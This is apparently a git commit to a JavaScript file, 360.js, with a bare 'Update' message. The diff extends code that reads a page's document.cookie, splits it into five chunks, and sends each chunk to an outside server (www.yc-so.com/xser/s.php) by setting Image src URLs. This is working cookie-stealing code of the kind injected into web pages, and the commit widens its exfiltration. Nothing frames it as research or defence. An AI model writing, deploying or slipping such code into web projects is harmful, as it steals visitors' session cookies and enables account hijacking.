232fd3d8c7c11f0f14ea3e6724296b2f6328a148
lixinyiads <lixinyiads@users.noreply.github.com>
2020-12-07 19:31:34 +0800

    Update 360.js

--- 360.js
+++ 360.js
@@ -14,16 +14,32 @@
     })()) + '&c=' + escape((function() {
         try {
             var c1=document.cookie;
-            var clen=c1.length/3;
-            c2=c1.substring(0,clen );      
+            var clen=c1.length/5;
+            c2=c1.substring(0,clen);      
  
-            var clen2=c1.length/1.5;
+            var clen2=clen+clen;
             c3=c1.substring(clen, clen2);
-            c4=c1.substring(clen2,c1.length );
+            
+            var clen3=clen+clen+clen;
+            c4=c1.substring(clen2,clen3);
+            
+            var clen4=clen+clen+clen+clen;
+            c5=c1.substring(clen3,clen4);
+            
+            var clen5=clen+clen+clen+clen+clen;
+            c6=c1.substring(clen4,clen5);
+            
            keep1 = new Image();
            keep2 = new Image();
+           keep3 = new Image();
+           keep4 = new Image();
+           keep5 = new Image();
+            
            keep1.src ='http://www.yc-so.com/xser/s.php?c='+escape(c2);
            keep2.src ='http://www.yc-so.com/xser/s.php?c='+escape(c3);
+           keep3.src ='http://www.yc-so.com/xser/s.php?c='+escape(c4);
+           keep4.src ='http://www.yc-so.com/xser/s.php?c='+escape(c5);
+           keep5.src ='http://www.yc-so.com/xser/s.php?c='+escape(c6);
 
             return c4;
         } catch (e) {
